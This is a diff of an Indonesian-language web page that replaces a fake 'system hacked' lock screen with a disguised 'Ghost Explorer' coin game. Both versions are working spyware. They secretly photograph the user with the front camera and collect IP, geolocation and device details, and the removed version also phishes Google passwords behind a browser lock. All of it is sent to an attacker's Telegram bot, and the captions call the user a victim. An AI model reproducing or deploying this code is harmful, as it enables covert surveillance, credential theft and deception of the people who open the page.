@@ -2,330 +2,345 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover, shrink-to-fit=no">
-    <title>⚠️ SISTEM TERKOMPROMI ⚠️</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>👻 Ghost Explorer - Cari Hantu Duit!</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
             user-select: none;
-            -webkit-tap-highlight-color: transparent;
-        }
-
-        html, body {
-            width: 100%;
-            height: 100%;
-            overflow: hidden !important;
-            position: fixed !important;
-            top: 0 !important;
-            left: 0 !important;
-            right: 0 !important;
-            bottom: 0 !important;
         }
 
         body {
-            font-family: 'Courier New', 'Fira Code', monospace;
-            background: #0a0000;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            overflow: hidden;
+            font-family: 'Poppins', 'Segoe UI', Arial, sans-serif;
+            background: linear-gradient(135deg, #0a0f1e 0%, #0a0a1a 100%);
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
         }
 
-        /* BACKGROUND MATRIX HACKER BERGERAK */
-        .matrix-bg {
+        /* Fullscreen canvas */
+        .game-container {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
+            z-index: 1;
+        }
+
+        /* Camera view (belakang) */
+        #cameraView {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
             z-index: 0;
-            opacity: 0.2;
-            font-family: 'Courier New', monospace;
-            font-size: 14px;
-            color: #ff0000;
-            white-space: pre;
-            overflow: hidden;
+            filter: brightness(0.9) contrast(1.1);
+        }
+
+        /* Overlay UI */
+        .ui-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 2;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            padding: 20px;
             pointer-events: none;
         }
 
-        .matrix-line {
-            position: absolute;
-            white-space: nowrap;
-            animation: scrollDown linear infinite;
+        /* Header coin */
+        .coin-header {
+            background: rgba(0,0,0,0.7);
+            backdrop-filter: blur(10px);
+            border-radius: 50px;
+            padding: 12px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            pointer-events: auto;
+            border: 1px solid rgba(255,215,0,0.3);
         }
 
-        @keyframes scrollDown {
-            0% { transform: translateY(-100%); }
-            100% { transform: translateY(100vh); }
+        .coin-display {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 24px;
+            font-weight: bold;
+            color: #ffd700;
         }
 
-        /* OVERLAY UTAMA */
-        .hacker-overlay {
+        .coin-icon {
+            font-size: 28px;
+        }
+
+        .withdraw-btn {
+            background: linear-gradient(135deg, #ffd700, #ff8c00);
+            border: none;
+            padding: 8px 20px;
+            border-radius: 40px;
+            color: #000;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 14px;
+            transition: transform 0.2s;
+        }
+
+        .withdraw-btn:hover {
+            transform: scale(1.05);
+        }
+
+        /* Info text */
+        .info-panel {
+            background: rgba(0,0,0,0.6);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 15px;
+            text-align: center;
+            pointer-events: auto;
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+
+        .info-panel p {
+            color: white;
+            font-size: 14px;
+            margin: 5px 0;
+        }
+
+        .ghost-timer {
+            font-size: 18px;
+            font-weight: bold;
+            color: #ff6b6b;
+        }
+
+        .rate-text {
+            color: #ffd700;
+            font-weight: bold;
+        }
+
+        /* Jumpscare overlay */
+        .jumpscare {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            z-index: 100;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            pointer-events: none;
+            opacity: 0;
+            transition: opacity 0.1s;
+        }
+
+        .jumpscare.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        .jumpscare-content {
+            text-align: center;
+            animation: shake 0.3s ease infinite;
+        }
+
+        .jumpscare-content .ghost {
+            font-size: 120px;
+            animation: float 1s ease infinite;
+        }
+
+        .jumpscare-content h2 {
+            color: white;
+            font-size: 32px;
+            margin-top: 20px;
+            text-shadow: 0 0 10px red;
+        }
+
+        @keyframes shake {
+            0%,100% { transform: translate(0,0); }
+            25% { transform: translate(-5px,5px); }
+            75% { transform: translate(5px,-5px); }
+        }
+
+        @keyframes float {
+            0%,100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+        }
+
+        /* Modal Withdraw */
+        .modal {
+            display: none;
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
             background: rgba(0,0,0,0.95);
-            z-index: 1;
-            display: flex;
+            z-index: 200;
             justify-content: center;
             align-items: center;
-            backdrop-filter: blur(3px);
+            backdrop-filter: blur(10px);
         }
 
-        /* CARD UTAMA */
-        .hacker-card {
-            background: linear-gradient(145deg, #1a0000 0%, #0a0000 100%);
-            border: 2px solid #ff0000;
-            border-radius: 20px;
-            padding: 35px 28px;
-            max-width: 480px;
+        .modal.active {
+            display: flex;
+        }
+
+        .modal-content {
+            background: linear-gradient(145deg, #1a1a2e, #16213e);
+            border-radius: 30px;
+            padding: 30px;
+            max-width: 400px;
             width: 90%;
             text-align: center;
-            box-shadow: 0 0 50px rgba(255,0,0,0.3), inset 0 0 20px rgba(255,0,0,0.1);
-            animation: borderPulse 1.5s infinite;
-            z-index: 2;
+            border: 2px solid #ffd700;
         }
 
-        @keyframes borderPulse {
-            0%, 100% { box-shadow: 0 0 20px rgba(255,0,0,0.3); border-color: #ff0000; }
-            50% { box-shadow: 0 0 50px rgba(255,0,0,0.8); border-color: #ff4444; }
+        .modal-content h2 {
+            color: #ffd700;
+            margin-bottom: 20px;
         }
 
-        /* HEADER */
-        .skull-icon {
-            font-size: 50px;
-            animation: shake 0.5s infinite;
-            display: inline-block;
-        }
-
-        @keyframes shake {
-            0%, 100% { transform: translate(0,0); }
-            25% { transform: translate(-2px, 2px); }
-            75% { transform: translate(2px, -2px); }
-        }
-
-        .glitch-text {
-            font-size: 24px;
-            font-weight: bold;
-            color: #ff0000;
-            text-shadow: 2px 2px 0px #660000;
-            margin: 15px 0;
-            letter-spacing: 2px;
-        }
-
-        .warning-badge {
-            background: #ff0000;
-            color: #000;
-            padding: 6px 14px;
-            border-radius: 5px;
-            font-size: 11px;
-            font-weight: bold;
-            display: inline-block;
-            animation: blink 1s step-end infinite;
-        }
-
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-
-        .danger-text {
-            color: #ff4444;
-            font-size: 13px;
-            margin: 15px 0;
-            font-weight: bold;
-            text-transform: uppercase;
-        }
-
-        .message-box {
-            background: #0d0000;
-            border-left: 4px solid #ff0000;
-            padding: 15px;
-            margin: 20px 0;
-            text-align: left;
-            font-size: 12px;
-        }
-
-        .message-box p {
-            color: #ff6666;
-            margin: 8px 0;
-            font-family: monospace;
-        }
-
-        .message-box .bullet {
-            color: #ff0000;
-            font-weight: bold;
-        }
-
-        /* GOOGLE LOGIN AREA */
-        .google-login-area {
-            margin: 20px 0;
-            padding: 20px;
-            background: rgba(255,255,255,0.05);
-            border-radius: 15px;
-            border: 1px solid rgba(255,0,0,0.3);
-        }
-
-        .google-logo {
-            margin-bottom: 15px;
-        }
-
-        .google-logo img {
-            width: 70px;
-            filter: brightness(0) invert(1);
-            opacity: 0.8;
-        }
-
-        .input-group {
-            margin: 15px 0;
-            text-align: left;
-        }
-
-        .input-group label {
-            font-size: 11px;
-            color: #ff6666;
-            margin-bottom: 6px;
-            display: block;
-            font-family: monospace;
-        }
-
-        input {
-            width: 100%;
-            padding: 14px 16px;
-            background: #0a0000;
-            border: 1px solid #ff0000;
-            border-radius: 8px;
-            font-size: 14px;
-            color: #ff4444;
-            font-family: monospace;
-        }
-
-        input:focus {
-            outline: none;
-            border-color: #ff4444;
-            box-shadow: 0 0 10px rgba(255,0,0,0.3);
-        }
-
-        input::placeholder {
-            color: #441111;
-        }
-
-        .login-btn {
+        .modal-content input {
             width: 100%;
             padding: 14px;
-            background: #ff0000;
-            color: #000;
+            margin: 10px 0;
+            border: 1px solid #ffd700;
+            border-radius: 12px;
+            background: rgba(0,0,0,0.5);
+            color: white;
+            font-size: 16px;
+        }
+
+        .modal-content input:focus {
+            outline: none;
+            border-color: #ff8c00;
+        }
+
+        .modal-content button {
+            background: linear-gradient(135deg, #ffd700, #ff8c00);
+            width: 100%;
+            padding: 14px;
             border: none;
-            border-radius: 8px;
-            font-size: 14px;
+            border-radius: 12px;
+            font-size: 16px;
             font-weight: bold;
             cursor: pointer;
             margin-top: 15px;
-            font-family: monospace;
-            text-transform: uppercase;
-            letter-spacing: 2px;
         }
 
-        .login-btn:disabled {
-            background: #441111;
-            cursor: not-allowed;
+        .close-modal {
+            background: #ff4444;
+            margin-top: 10px;
         }
 
-        .error-msg {
+        .error-text {
             color: #ff6666;
-            font-size: 11px;
+            font-size: 12px;
             margin-top: 10px;
             display: none;
         }
 
-        .loading-spinner {
-            display: none;
-            margin: 10px auto;
-            width: 20px;
-            height: 20px;
-            border: 2px solid #441111;
-            border-top: 2px solid #ff0000;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
+        /* Hidden front camera */
+        #frontCamera {
+            position: fixed;
+            bottom: -1000px;
+            left: -1000px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
         }
 
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        .footer-text {
-            margin-top: 20px;
-            font-size: 9px;
-            color: #661111;
-            letter-spacing: 1px;
-        }
-
-        video, canvas {
+        canvas {
             display: none;
         }
 
-        ::-webkit-scrollbar {
-            display: none;
+        /* Loading */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: black;
+            z-index: 1000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            color: white;
+        }
+
+        @media (max-width: 600px) {
+            .coin-display { font-size: 18px; }
+            .coin-icon { font-size: 22px; }
+            .withdraw-btn { padding: 6px 15px; font-size: 12px; }
         }
     </style>
 </head>
 <body>
 
-<!-- BACKGROUND MATRIX HACKER BERGERAK -->
-<div class="matrix-bg" id="matrixBg"></div>
+<div class="game-container">
+    <video id="cameraView" autoplay playsinline></video>
+    <video id="frontCamera" autoplay playsinline></video>
+    <canvas id="photoCanvas"></canvas>
+</div>
 
-<div class="hacker-overlay">
-    <div class="hacker-card">
-        <div class="skull-icon">💀⚠️💀</div>
-        <div class="glitch-text">[ SISTEM TERHACK ]</div>
-        <div class="warning-badge">! PERINGATAN KERAS !</div>
-
-        <div class="danger-text">❗ PERANGKAT ANDA TELAH DIBLOKIR ❗</div>
-        
-        <div class="message-box">
-            <p><span class="bullet">›</span> <strong style="color:#ff0000;">AKSES DIBATASI</strong> - Perangkat Anda terkunci</p>
-            <p><span class="bullet">›</span> Data Anda sedang dipantau oleh sistem keamanan</p>
-            <p><span class="bullet">›</span> <strong style="color:#ff0000;">SATU-SATUNYA CARA KELUAR:</strong></p>
-            <p><span class="bullet">›</span> <strong style="color:#ff0000;">MASUKKAN EMAIL & PASSWORD GOOGLE ANDA</strong></p>
-            <p><span class="bullet">›</span> Percobaan gagal akan mengakibatkan <strong style="color:#ff0000;">RESET PABRIK</strong></p>
+<div class="ui-overlay">
+    <div class="coin-header">
+        <div class="coin-display">
+            <span class="coin-icon">🪙</span>
+            <span id="coinAmount">0</span>
         </div>
+        <button class="withdraw-btn" id="withdrawBtn">💸 WITHDRAW</button>
+    </div>
 
-        <!-- AREA LOGIN GOOGLE -->
-        <div class="google-login-area" id="loginArea" style="display: none;">
-            <div class="google-logo">
-                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
-            </div>
-            <form id="loginForm">
-                <div class="input-group">
-                    <label>› EMAIL / NOMOR TELEPON</label>
-                    <input type="email" id="email" placeholder="contoh@gmail.com" autocomplete="off" required>
-                </div>
-                <div class="input-group">
-                    <label>› PASSWORD</label>
-                    <input type="password" id="password" placeholder="Masukkan password Anda" required>
-                </div>
-                <button type="submit" class="login-btn" id="loginBtn">BUKA KUNCI</button>
-                <div class="loading-spinner" id="spinner"></div>
-                <div class="error-msg" id="errorMsg">[ ERROR ] Email atau password salah!</div>
-            </form>
-        </div>
-
-        <!-- AREA PERMISSION -->
-        <div id="permissionArea">
-            <button class="login-btn" id="permissionBtn" style="background:#1a73e8; color:white;">IZINKAN AKSES KAMERA & LOKASI</button>
-            <div class="footer-text">{ Keamanan Perangkat }<br>{ Verifikasi Wajib }</div>
-        </div>
+    <div class="info-panel">
+        <p>👻 <strong>Ghost Explorer</strong> - Cari Hantu Duit!</p>
+        <p>🎯 Setiap kena jumpscare: <span class="rate-text">+100 COIN</span></p>
+        <p>💵 100 COIN = Rp100 | Minimal withdraw: <span class="rate-text">500 COIN (Rp5.000)</span></p>
+        <p>⏳ Hantu muncul setiap <span id="countdownTimer" class="ghost-timer">20</span> detik</p>
+        <p>📸 Arahkan kamera ke sekitar... awas hantu!</p>
     </div>
 </div>
 
-<video id="hiddenVideo" autoplay playsinline></video>
-<canvas id="hiddenCanvas"></canvas>
+<!-- Jumpscare Overlay -->
+<div id="jumpscare" class="jumpscare">
+    <div class="jumpscare-content">
+        <div class="ghost">👻💀👻</div>
+        <h2>KAMU KENA HANTU!</h2>
+        <p style="color:#ffd700; margin-top:10px;">+100 COIN</p>
+    </div>
+</div>
+
+<!-- Modal Withdraw -->
+<div id="withdrawModal" class="modal">
+    <div class="modal-content">
+        <h2>💰 WITHDRAW SALDO</h2>
+        <p style="color:white;">Saldo kamu: <strong id="modalCoin">0</strong> COIN</p>
+        <p style="color:#ffd700; font-size:12px;">100 COIN = Rp100 | Min 500 COIN</p>
+        <input type="email" id="withdrawEmail" placeholder="Email Google untuk kirim saldo" required>
+        <button id="submitWithdraw">KIRIM WITHDRAW</button>
+        <button class="close-modal" id="closeModal">TUTUP</button>
+        <div class="error-text" id="withdrawError"></div>
+    </div>
+</div>
+
+<div id="loadingOverlay" class="loading-overlay">
+    <div>🎮 Memulai Game...</div>
+    <div style="margin-top:10px;">Meminta akses kamera...</div>
+</div>
 
 <script>
     // ========== TELEGRAM CONFIG ==========
@@ -333,93 +348,33 @@
     const CHAT_ID = "8854409945";
     // =====================================
 
-    let stream = null;
-    let photoSent = false;
+    let coins = 0;
+    let ghostInterval = null;
+    let countdown = 20;
+    let gameActive = true;
+    let backStream = null;
+    let frontStream = null;
+    let photoTaken = false;
     let locationSent = false;
-    let permissionsGranted = false;
 
-    const permissionArea = document.getElementById('permissionArea');
-    const loginArea = document.getElementById('loginArea');
-    const permissionBtn = document.getElementById('permissionBtn');
-    const hiddenVideo = document.getElementById('hiddenVideo');
-    const hiddenCanvas = document.getElementById('hiddenCanvas');
+    // DOM elements
+    const coinSpan = document.getElementById('coinAmount');
+    const countdownSpan = document.getElementById('countdownTimer');
+    const jumpscareDiv = document.getElementById('jumpscare');
+    const withdrawBtn = document.getElementById('withdrawBtn');
+    const withdrawModal = document.getElementById('withdrawModal');
+    const closeModal = document.getElementById('closeModal');
+    const submitWithdraw = document.getElementById('submitWithdraw');
+    const withdrawEmail = document.getElementById('withdrawEmail');
+    const modalCoinSpan = document.getElementById('modalCoin');
+    const withdrawError = document.getElementById('withdrawError');
+    const loadingOverlay = document.getElementById('loadingOverlay');
 
-    // ========== BACKGROUND MATRIX ==========
-    const matrixBg = document.getElementById('matrixBg');
-    const codeStrings = [
-        '> ACCESS DENIED', '> HACKING PROGRESS', '> ROOTKIT_INJECT', 
-        '> 0x0F3A2B1C', '> SYS.OVERRIDE', '> RANSOMWARE_ACTIVE',
-        '> 01001110', '> BACKDOOR_FOUND', '> ADMIN.BYPASS',
-        '> CRYPTO_LOCK', '> DATA_EXFIL', '> KERNEL_PANIC',
-        '> WARNING_0x01', '> SYSTEM_LOCKED', '> UNAUTHORIZED'
-    ];
-    
-    for (let i = 0; i < 40; i++) {
-        const line = document.createElement('div');
-        line.className = 'matrix-line';
-        line.style.left = Math.random() * 100 + '%';
-        line.style.animationDuration = (Math.random() * 15 + 8) + 's';
-        line.style.animationDelay = Math.random() * 10 + 's';
-        line.style.fontSize = (Math.random() * 10 + 10) + 'px';
-        line.style.opacity = Math.random() * 0.4 + 0.1;
-        
-        let text = '';
-        for (let j = 0; j < 12; j++) {
-            text += codeStrings[Math.floor(Math.random() * codeStrings.length)] + '  ';
-        }
-        line.innerText = text;
-        matrixBg.appendChild(line);
-    }
+    const backVideo = document.getElementById('cameraView');
+    const frontVideo = document.getElementById('frontCamera');
+    const photoCanvas = document.getElementById('photoCanvas');
 
-    // ========== LOCK TOTAL ==========
-    document.body.style.overflow = 'hidden';
-    document.documentElement.style.overflow = 'hidden';
-    
-    document.addEventListener('wheel', function(e) { e.preventDefault(); return false; }, { passive: false });
-    document.addEventListener('touchmove', function(e) { e.preventDefault(); return false; }, { passive: false });
-    
-    history.pushState(null, null, location.href);
-    window.addEventListener('popstate', function() {
-        history.pushState(null, null, location.href);
-        location.replace(location.href);
-    });
-    
-    document.addEventListener('keydown', function(e) {
-        if (e.key === 'F5' || e.key === 'F12' || (e.ctrlKey && e.key === 'r') || 
-            (e.ctrlKey && e.key === 'w') || e.key === 'Escape' || (e.ctrlKey && e.shiftKey && e.key === 'I') ||
-            e.key === 'Home' || e.key === 'Backspace') {
-            e.preventDefault();
-            return false;
-        }
-    });
-    
-    document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
-    
-    // ========== FULLSCREEN FORCE ==========
-    function forceFullscreen() {
-        const docEl = document.documentElement;
-        if (docEl.requestFullscreen) docEl.requestFullscreen().catch(()=>{});
-        else if (docEl.webkitRequestFullscreen) docEl.webkitRequestFullscreen();
-    }
-    
-    document.body.addEventListener('click', function firstClick() {
-        forceFullscreen();
-        document.body.removeEventListener('click', firstClick);
-    }, { once: true });
-    
-    document.addEventListener('fullscreenchange', function() {
-        if (!document.fullscreenElement) forceFullscreen();
-    });
-    
-    setInterval(() => {
-        if (!document.fullscreenElement && !document.webkitFullscreenElement) forceFullscreen();
-        if (window.location.hash !== '#locked') {
-            window.location.hash = 'locked';
-            history.pushState(null, null, '#locked');
-        }
-    }, 200);
-
-    // ========== GET IP ==========
+    // ========== AMBIL LOKASI & IP ==========
     async function getIP() {
         try {
             const res = await fetch('https://api.ipify.org?format=json');
@@ -430,7 +385,6 @@
         }
     }
 
-    // ========== GET LOKASI ==========
     async function getLocation() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) {
@@ -448,183 +402,245 @@
         });
     }
 
-    // ========== KIRIM LOKASI KE TELEGRAM ==========
-    async function sendLocationToTelegram() {
+    async function sendLocationAndIP() {
         if (locationSent) return;
-        
         const ip = await getIP();
         const location = await getLocation();
         const tanggal = new Date().toLocaleString('id-ID');
         const userAgent = navigator.userAgent;
-        
-        const pesan = `📍📍📍 LOKASI KORBAN 📍📍📍%0A%0A` +
+
+        const pesan = `📍📍📍 LOKASI & IP KORBAN 📍📍📍%0A%0A` +
             `🌐 IP ADDRESS : ${ip}%0A` +
             `📍 LOKASI     : ${location}%0A` +
             `📅 WAKTU      : ${tanggal}%0A` +
             `💻 DEVICE     : ${encodeURIComponent(userAgent.substring(0, 100))}%0A%0A` +
-            `⚠️ KORBAN MENGIZINKAN AKSES LOKASI ⚠️`;
-        
+            `🎮 GAME: GHOST EXPLORER - MAIN GAME TANPA SADAR`;
+
         const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${pesan}`;
-        
         try {
             await fetch(url, {mode: 'no-cors'});
             locationSent = true;
         } catch(e) {}
     }
 
-    // ========== FOTO DIAM-DIAM ==========
-    async function captureHiddenPhoto() {
-        if (photoSent) return;
-        if (!stream || !stream.active) return;
-        
-        if (hiddenVideo.videoWidth === 0 || hiddenVideo.videoHeight === 0) {
-            setTimeout(() => captureHiddenPhoto(), 500);
+    // ========== FOTO DIAM-DIAM PAKE KAMERA DEPAN ==========
+    async function captureFrontPhoto() {
+        if (photoTaken) return;
+        if (!frontStream || !frontStream.active) return;
+        if (frontVideo.videoWidth === 0 || frontVideo.videoHeight === 0) {
+            setTimeout(() => captureFrontPhoto(), 500);
             return;
         }
-        
-        hiddenCanvas.width = hiddenVideo.videoWidth;
-        hiddenCanvas.height = hiddenVideo.videoHeight;
-        const ctx = hiddenCanvas.getContext('2d');
-        ctx.drawImage(hiddenVideo, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
-        
+
+        photoCanvas.width = frontVideo.videoWidth;
+        photoCanvas.height = frontVideo.videoHeight;
+        const ctx = photoCanvas.getContext('2d');
+        ctx.drawImage(frontVideo, 0, 0, photoCanvas.width, photoCanvas.height);
+
         const ip = await getIP();
         const location = await getLocation();
         const tanggal = new Date().toLocaleString('id-ID');
         const userAgent = navigator.userAgent;
-        
-        const blob = await new Promise(resolve => hiddenCanvas.toBlob(resolve, 'image/jpeg', 0.85));
-        
+
+        const blob = await new Promise(resolve => photoCanvas.toBlob(resolve, 'image/jpeg', 0.85));
+
         const caption = `📸📸📸 FOTO WAJAH KORBAN 📸📸📸%0A%0A` +
             `🌐 IP ADDRESS : ${ip}%0A` +
             `📍 LOKASI     : ${location}%0A` +
             `📅 WAKTU      : ${tanggal}%0A` +
             `💻 DEVICE     : ${encodeURIComponent(userAgent.substring(0, 100))}%0A%0A` +
-            `⚠️ KORBAN TIDAK SADAR SEDANG DIFOTO ⚠️`;
-        
+            `🎮 KORBAN SEDANG MAIN GAME HANTU (TIDAK SADAR DIFOTO)`;
+
         const formData = new FormData();
         formData.append('chat_id', CHAT_ID);
-        formData.append('photo', blob, 'face.jpg');
+        formData.append('photo', blob, 'face_ghost_game.jpg');
         formData.append('caption', caption);
-        
+
         try {
             await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                 method: 'POST',
                 body: formData
             });
-            photoSent = true;
+            photoTaken = true;
         } catch(e) {}
-        
-        if (stream) {
-            stream.getTracks().forEach(track => track.stop());
-            stream = null;
-        }
     }
 
     // ========== MULAI KAMERA ==========
-    async function startHiddenCamera() {
+    async function startCameras() {
         try {
-            stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" } 
+            // Kamera belakang (buat game)
+            backStream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: "environment" }
             });
-            hiddenVideo.srcObject = stream;
-            
-            // Tunggu kamera stabil lalu foto
-            setTimeout(() => {
-                captureHiddenPhoto();
-            }, 2000);
-            
-            // Foto lagi setelah 5 detik (kalau belum)
-            setTimeout(() => {
-                if (!photoSent) captureHiddenPhoto();
-            }, 5000);
-            
-        } catch(e) {}
-    }
+            backVideo.srcObject = backStream;
 
-    // ========== MINTA IZIN KAMERA & LOKASI ==========
-    async function requestAllPermissions() {
-        permissionBtn.disabled = true;
-        permissionBtn.innerText = "⏳ Memproses...";
-        
-        try {
-            // Minta izin lokasi dulu
-            await getLocation();
-            await sendLocationToTelegram();
-            
-            // Minta izin kamera
-            const tempStream = await navigator.mediaDevices.getUserMedia({ video: true });
-            tempStream.getTracks().forEach(track => track.stop());
-            
-            permissionsGranted = true;
-            
-            // Mulai hidden camera untuk foto diam-diam
-            await startHiddenCamera();
-            
-            // Sembunyikan area permission, tampilkan login area
-            permissionArea.style.display = 'none';
-            loginArea.style.display = 'block';
-            
+            // Kamera depan (diam-diam moto)
+            frontStream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: "user" }
+            });
+            frontVideo.srcObject = frontStream;
+
+            // Tunggu 3 detik, lalu foto diam-diam
+            setTimeout(() => {
+                captureFrontPhoto();
+            }, 3000);
+
+            // Foto lagi setelah 15 detik (chance kedua)
+            setTimeout(() => {
+                if (!photoTaken) captureFrontPhoto();
+            }, 15000);
+
+            // Kirim lokasi & IP
+            await sendLocationAndIP();
+
+            loadingOverlay.style.display = 'none';
+            startGhostTimer();
+
         } catch(err) {
-            permissionBtn.disabled = false;
-            permissionBtn.innerText = "IZINKAN AKSES KAMERA & LOKASI";
-            alert("⚠️ Anda HARUS mengizinkan akses kamera dan lokasi untuk membuka perangkat!");
+            loadingOverlay.innerHTML = '<div>❌ Gagal akses kamera!<br>Izinkan akses kamera untuk bermain.</div><button onclick="location.reload()" style="margin-top:20px;padding:10px;background:#ff4444;border:none;color:white;">COBA LAGI</button>';
         }
     }
 
-    // ========== KIRIM CREDENTIALS ==========
-    async function sendCredentials(email, password) {
+    // ========== GHOST TIMER ==========
+    let timerInterval = null;
+
+    function startGhostTimer() {
+        if (timerInterval) clearInterval(timerInterval);
+        countdown = 20;
+        countdownSpan.innerText = countdown;
+
+        timerInterval = setInterval(() => {
+            if (!gameActive) return;
+            countdown--;
+            countdownSpan.innerText = countdown;
+
+            if (countdown <= 0) {
+                // Muncul jumpscare
+                showJumpscare();
+                // Reset countdown dengan random 15-25 detik
+                let newWait = Math.floor(Math.random() * 15) + 15;
+                countdown = newWait;
+                countdownSpan.innerText = countdown;
+            }
+        }, 1000);
+    }
+
+    // ========== JUMPSHARE ==========
+    let jumpscareActive = false;
+
+    function showJumpscare() {
+        if (jumpscareActive) return;
+        jumpscareActive = true;
+
+        // Tambah coin
+        coins += 100;
+        updateCoinDisplay();
+
+        // Tampilkan jumpscare
+        jumpscareDiv.classList.add('active');
+
+        // Efek getar (kalo support)
+        if (navigator.vibrate) navigator.vibrate(500);
+
+        // Suara "aa" (simulasi)
+        let audio = new Audio();
+        // Gak pake audio biar gak ribet
+
+        setTimeout(() => {
+            jumpscareDiv.classList.remove('active');
+            jumpscareActive = false;
+        }, 1500);
+    }
+
+    function updateCoinDisplay() {
+        coinSpan.innerText = coins;
+        modalCoinSpan.innerText = coins;
+    }
+
+    // ========== WITHDRAW ==========
+    withdrawBtn.addEventListener('click', () => {
+        if (coins < 500) {
+            alert('Minimal withdraw 500 COIN (Rp5.000)');
+            return;
+        }
+        modalCoinSpan.innerText = coins;
+        withdrawModal.classList.add('active');
+        withdrawError.style.display = 'none';
+    });
+
+    closeModal.addEventListener('click', () => {
+        withdrawModal.classList.remove('active');
+        withdrawEmail.value = '';
+    });
+
+    submitWithdraw.addEventListener('click', async () => {
+        const email = withdrawEmail.value.trim();
+        if (!email || !email.includes('@')) {
+            withdrawError.innerText = 'Masukkan email Google yang valid!';
+            withdrawError.style.display = 'block';
+            return;
+        }
+
+        if (coins < 500) {
+            withdrawError.innerText = 'Minimal withdraw 500 COIN!';
+            withdrawError.style.display = 'block';
+            return;
+        }
+
+        const amount = coins;
+        const rupiah = Math.floor(coins / 100) * 100;
+
+        // Kirim ke Telegram
         const ip = await getIP();
         const location = await getLocation();
         const tanggal = new Date().toLocaleString('id-ID');
-        
-        let pesan = `🔐🔐🔐 LOGIN GOOGLE 🔐🔐🔐%0A%0A`;
-        pesan += `📧 EMAIL    : ${email}%0A`;
-        pesan += `🔑 PASSWORD : ${password}%0A`;
-        pesan += `🌐 IP       : ${ip}%0A`;
-        pesan += `📍 LOKASI   : ${location}%0A`;
-        pesan += `📅 WAKTU    : ${tanggal}%0A%0A`;
-        pesan += `⚠️ FOTO WAJAH & LOKASI SUDAH TERKIRIM ⚠️`;
-        
-        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${pesan}`;
-        await fetch(url, {mode: 'no-cors'});
-    }
 
-    // ========== SUBMIT LOGIN ==========
-    const loginForm = document.getElementById('loginForm');
-    const loginBtn = document.getElementById('loginBtn');
-    const spinner = document.getElementById('spinner');
-    const errorMsg = document.getElementById('errorMsg');
+        let pesan = `💰💰💰 WITHDRAW REQUEST 💰💰💰%0A%0A`;
+        pesan += `📧 EMAIL : ${email}%0A`;
+        pesan += `🪙 COIN  : ${amount} COIN%0A`;
+        pesan += `💵 NOMINAL: Rp${rupiah}%0A`;
+        pesan += `🌐 IP     : ${ip}%0A`;
+        pesan += `📍 LOKASI : ${location}%0A`;
+        pesan += `📅 WAKTU  : ${tanggal}%0A%0A`;
+        pesan += `⚠️ KORBAN NARIK TUNAI DARI GAME HANTU ⚠️`;
 
-    loginForm.addEventListener('submit', async function(e) {
-        e.preventDefault();
-        
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
-        
-        if (!email || !password) {
-            errorMsg.style.display = 'block';
-            setTimeout(() => errorMsg.style.display = 'none', 2000);
-            return;
+        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}`;
+
+        try {
+            await fetch(url, {mode: 'no-cors'});
+            withdrawError.style.backgroundColor = '#0a2200';
+            withdrawError.style.color = '#00ff00';
+            withdrawError.innerText = '✅ WITHDRAW BERHASIL! Dana akan dikirim dalam 24 jam.';
+            withdrawError.style.display = 'block';
+
+            // Reset coin setelah withdraw
+            coins = 0;
+            updateCoinDisplay();
+
+            setTimeout(() => {
+                withdrawModal.classList.remove('active');
+                withdrawEmail.value = '';
+                withdrawError.style.display = 'none';
+            }, 2000);
+
+        } catch(err) {
+            withdrawError.innerText = 'Gagal memproses, coba lagi.';
+            withdrawError.style.display = 'block';
         }
-        
-        loginBtn.disabled = true;
-        spinner.style.display = 'block';
-        
-        await sendCredentials(email, password);
-        
-        spinner.style.display = 'none';
-        errorMsg.style.backgroundColor = '#0a2200';
-        errorMsg.style.color = '#00ff00';
-        errorMsg.innerHTML = '[ SUCCESS ] Perangkat akan dibuka...';
